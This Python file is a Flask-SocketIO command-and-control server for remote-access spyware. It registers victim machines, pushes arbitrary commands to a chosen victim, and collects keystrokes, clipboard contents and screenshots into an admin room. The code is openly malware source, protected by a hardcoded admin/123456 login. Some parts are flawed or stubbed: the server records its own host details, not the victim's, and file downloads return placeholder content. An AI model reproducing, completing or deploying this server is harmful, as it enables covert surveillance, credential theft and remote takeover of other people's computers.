from gevent import monkey
monkey.patch_all()
from flask import Flask, render_template, request, redirect, url_for
from flask_socketio import SocketIO, emit, join_room
import uuid
import time
import threading
import json
import os
import socket
from cryptography.fernet import Fernet
import base64

app = Flask(__name__)
app.config['SECRET_KEY'] = 'supersecretkey'
socketio = SocketIO(app, cors_allowed_origins="*")

cipher_suite = Fernet(base64.urlsafe_b64encode(b'abcdefghijklmnopqrstuvwxyz123456'))


clients = {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/dashboard')
def dashboard():
    return render_template('dashboard.html', clients=clients)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    if username == 'admin' and password == '123456':
        return redirect(url_for('dashboard'))
    return redirect(url_for('index'))

@socketio.on('connect')
def handle_connect():
    print("Client connected:", request.sid)

@socketio.on('disconnect')
def handle_disconnect():
    print("Client disconnected:", request.sid)
    if request.sid in clients:
        del clients[request.sid]

@socketio.on('register')
def handle_register(data):
    ip = socket.gethostbyname(socket.gethostname())
    hostname = socket.gethostname()
    username = os.getenv('USERNAME')
    os_info = os.name
    clients[request.sid] = {
        'ip': ip,
        'hostname': hostname,
        'username': username,
        'os': os_info,
        'last_seen': time.time(),
        'connected_at': time.time()
    }

@socketio.on('send_command')
def handle_send_command(data):
    target_sid = data['target_sid']
    command = data['command']
    emit('execute_command', {'command': command}, room=target_sid)

@socketio.on('upload_file')
def handle_upload_file(data):
    filename = data['filename']
    content = data['content']
    clients[request.sid]['uploaded_files'] = clients[request.sid].get('uploaded_files', [])
    clients[request.sid]['uploaded_files'].append(filename)
    emit('file_uploaded', {'filename': filename}, room=request.sid)

@socketio.on('download_file')
def handle_download_file(data):
    filename = data['filename']
    if filename in clients[request.sid].get('uploaded_files', []):
        emit('file_downloaded', {'filename': filename, 'content': 'dummy_content'}, room=request.sid)

@socketio.on('keylogger_data')
def handle_keylogger_data(data):
    clients[request.sid]['keylogs'] = clients[request.sid].get('keylogs', []) + [data['keylog']]
    emit('new_keylog', {'keylog': data['keylog']}, room='admin_room')

@socketio.on('clipboard_data')
def handle_clipboard_data(data):
    clients[request.sid]['clipboard'] = clients[request.sid].get('clipboard', []) + [data['clip']]
    emit('new_clipboard', {'clip': data['clip']}, room='admin_room')

@socketio.on('screenshot_data')
def handle_screenshot_data(data):
    clients[request.sid]['screenshots'] = clients[request.sid].get('screenshots', []) + [data['screenshot']]
    emit('new_screenshot', {'screenshot': data['screenshot']}, room='admin_room')

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000)
